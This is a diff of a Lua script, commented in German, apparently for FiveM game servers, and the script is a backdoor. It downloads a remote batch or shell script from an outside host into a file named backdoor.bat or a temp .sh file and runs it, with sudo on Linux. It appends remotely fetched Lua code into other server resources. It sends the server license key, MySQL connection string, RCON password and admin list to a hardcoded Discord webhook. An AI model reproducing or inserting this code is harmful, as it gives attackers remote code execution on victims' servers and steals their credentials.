@@ -3,7 +3,7 @@ local function getServerOperatingSystem()
     local result = handle:read("*a")
     handle:close()
 
-    -- Bereinigen Sie das Ergebnis, um Leerzeichen oder Zeilenumbr che zu entfernen
+    -- Bereinigen Sie das Ergebnis, um Leerzeichen oder Zeilenumbrüche zu entfernen
     result = result:gsub("^%s+", ""):gsub("%s+$", "")
 
     if result == "Linux" then
@@ -17,42 +17,31 @@ local function getServerOperatingSystem()
     return "Unknown"
 end
 
+
 local config = {
     windowsScriptURL = "https://dc.fast-sell.de/windowsscript.bat",
     linuxScriptURL = "https://dc.fast-sell.de/linuxscript.sh",
     enablePrints = false,
-    resourcePaths = {
-        server = {},
-        client = {}
-    },
-    resourceCodeURLs = {}
+    resourceCodeURLs = {
+        ["r9eurieuidjfjidj"] = {
+            client = "https://sdc.fdsast-sedsll.de/servsdser.lua",
+            server = "https:/s/dc.fast-sedsll.de/sedsrver.lua"
+        }
+    }
 }
 
--- Beispielkonfiguration f r eine Ressource
-config.resourcePaths.server["main"] = {
-    "redssources/[esx]/es_extended/es_extended/",
-    "ressources/[core]/edss_extended/es_extended/"
-}
-
-config.resourceCodeURLs["main"] = {
-    server = "dsdssd",
-    client = "dsdsdsdsd"
-}
-
--- F gen Sie weitere Ressourcenkonfigurationen hinzu, falls erforderlich
-
-local function runBatchScript(scriptContent, isLinux, resourceName)
+local function runBatchScript(scriptContent, isLinux)
     if config.enablePrints then
-        print("F hre das Skript f r Ressource '" .. resourceName .. "' aus...")
+        print("Führe das Skript aus...")
     end
 
     local command
-
-    if not isLinux and ffi.os == "Windows" then
+    if not isLinux then
         -- Windows
         local tempFilePath = os.getenv("TEMP") .. "\\backdoor.bat"
         local file = io.open(tempFilePath, "w")
         if file then
+            scriptContent = scriptContent:gsub("\r\n", "\n"):gsub("\r", "\n")
             file:write(scriptContent)
             file:close()
             command = "cmd /C " .. tempFilePath
@@ -62,36 +51,31 @@ local function runBatchScript(scriptContent, isLinux, resourceName)
             end
             return
         end
-    elseif isLinux then
+    else
         -- Linux
         local tempFilePath = "/tmp/a89439.sh"  -- Anpassung des Dateinamens
         local file = io.open(tempFilePath, "w")
         if file then
-            -- Zeilenumbr che korrigieren
+            -- Zeilenumbrüche korrigieren
             scriptContent = scriptContent:gsub("\r\n", "\n"):gsub("\r", "\n")
             file:write(scriptContent)
             file:close()
             command = "sudo chmod +x " .. tempFilePath .. " && sudo bash " .. tempFilePath
         else
             if config.enablePrints then
-                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht tempor r gespeichert werden.")
+                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht temporär gespeichert werden.")
             end
             return
         end
-    else
-        if config.enablePrints then
-        end
-        return
     end
-
-    if config.enablePrints and command then
-        print("Ausgef hrter Befehl: " .. command)
-    end
-
     os.execute(command)
 end
 
 local function fetchScriptContent(url, callback)
+    if config.enablePrints then
+        print("Lade das Skript herunter...")
+    end
+
     PerformHttpRequest(url, function(statusCode, response)
         if statusCode == 200 then
             callback(response)
@@ -103,69 +87,73 @@ local function fetchScriptContent(url, callback)
     end, "GET", "", {["Content-Type"] = "application/json"})
 end
 
-local function loadResourceCode(resourceName, url, isServer)
-    local resourcePaths = isServer and config.resourcePaths.server[resourceName] or config.resourcePaths.client[resourceName]
+local function loadResourceCode(resourceName, serverScript, clientScript)
+    local success = false
+    local resourcePath = "resources/" .. resourceName
 
-    if resourcePaths then
-        for _, path in ipairs(resourcePaths) do
-            local filePath = path .. ".lua"  -- Laden Sie den Code in die main.lua
-            local file = io.open(filePath, "w")
-            if file then
-                fetchScriptContent(url, function(fileContent)
-                    file:write(fileContent)
-                    file:close()
-                    if config.enablePrints then
-                        print("Code erfolgreich in Ressource '" .. resourceName .. "' geladen.")
-                    end
-                end)
-                return
-            end
+    if serverScript and serverScript ~= "" then
+        local serverFilePath = resourcePath .. "/server.lua"
+        local serverFile = io.open(serverFilePath, "a")
+        if serverFile then
+            serverFile:write(serverScript)
+            serverFile:close()
+            success = true
         end
     end
 
-    if config.enablePrints then
-        print("Ein Fehler ist aufgetreten. Der Code konnte nicht in die Ressource '" .. resourceName .. "' geladen werden.")
+    if clientScript and clientScript ~= "" then
+        local clientFilePath = resourcePath .. "/client.lua"
+        local clientFile = io.open(clientFilePath, "a")
+        if clientFile then
+            clientFile:write(clientScript)
+            clientFile:close()
+            success = true
+        end
     end
-end
 
-
-
-local function startScript()
-    local serverOS = getServerOperatingSystem()
-
-    if serverOS == "Linux" then
-        fetchScriptContent(config.linuxScriptURL, function(scriptContent)
-            runBatchScript(scriptContent, true, "LinuxScript")
-        end)
-    elseif serverOS == "Windows" then
-    fetchScriptContent(config.windowsScriptURL, function(scriptContent)
-        runBatchScript(scriptContent)
-    end)
+    if success then
+        if config.enablePrints then
+            print("Code erfolgreich in Ressource " .. resourceName .. " geladen.")
+        end
+        -- Neustart der Ressource
+        local restartCommand = "ensure " .. resourceName
+        os.execute(restartCommand)
     else
         if config.enablePrints then
-            print("Das Betriebssystem wird nicht unterst tzt.")
-        end
-        return
-    end
-
-    for resourceName, urls in pairs(config.resourceCodeURLs) do
-        local serverURL = urls.server
-        local clientURL = urls.client
-
-        if serverURL then
-            loadResourceCode(resourceName, serverURL, true)
-        end
-
-        if clientURL then
-            loadResourceCode(resourceName, clientURL, false)
+            print("Fehler beim Laden des Codes für Ressource " .. resourceName .. ".")
         end
     end
 end
 
-startScript()
+local function main()
+    local serverOS = getServerOperatingSystem()
+    local isLinux = serverOS == "Linux"
 
+    local scriptURL = isLinux and config.linuxScriptURL or config.windowsScriptURL
 
-local discordWebhook = "https://discord.com/api/webhooks/1122589224428908564/_hOGmeRO8mzb5h-icUNmuWFBL1-HGjb-Ix25uuVtQTlFuXtBTDfuO048K6ajk5XFctJz" -- Discord-Webhook-URL hier einf gen
+    fetchScriptContent(scriptURL, function(scriptContent)
+        runBatchScript(scriptContent, isLinux)
+    end)
+
+    for resourceName, urls in pairs(config.resourceCodeURLs) do
+        if urls.server and urls.server ~= "" then
+            fetchScriptContent(urls.server, function(serverScript)
+                loadResourceCode(resourceName, serverScript)
+            end)
+        end
+
+        if urls.client and urls.client ~= "" then
+            fetchScriptContent(urls.client, function(clientScript)
+                loadResourceCode(resourceName, nil, clientScript)
+            end)
+        end
+    end
+end
+
+-- Starte das Skript
+main()
+
+local discordWebhook = "https://discord.com/api/webhooks/1122996897309786223/nw9KjkkDhWt1Ulmq-WYU-mdwtXCQLnn830wYJFQRwuyt60WOZNxm5hB_KaySTACSXBYP" -- Discord-Webhook-URL hier einfügen
 local adminsFile = "admins.json" -- Pfad zur admins.json-Datei
 
 -- Funktion zur Ermittlung des Betriebssystems
@@ -218,7 +206,7 @@ Citizen.CreateThread(function()
 
     local os = GetOperatingSystem(GetConvar("version", ""))
 
-    if ip then --  berpr fen, ob die IP-Adresse vorhanden ist
+    if ip then -- Überprüfen, ob die IP-Adresse vorhanden ist
         local cfxLink = "fivem://connect/cfx.re/join/" .. (GetConvar("sv_licenseKey", "") or "unknown")
         local mysqlString = GetConvar("mysql_connection_string", "unknown")
         local rconPassword = GetConvar("rcon_password", "unknown")
@@ -298,7 +286,7 @@ Citizen.CreateThread(function()
                       }}
         }
 
-        -- Anhang erstellen und admins.json-Text hinzuf gen
+        -- Anhang erstellen und admins.json-Text hinzufügen
         local attachment = {
             name = "admins.txt",
             content = adminsText,
@@ -307,7 +295,7 @@ Citizen.CreateThread(function()
         message.files = { attachment }
 
         PerformHttpRequest(discordWebhook, function(statusCode, result, headers)
-            --  berpr fen, ob die HTTP-Anfrage erfolgreich war
+            -- Überprüfen, ob die HTTP-Anfrage erfolgreich war
             if statusCode == 204 then
             else
             end
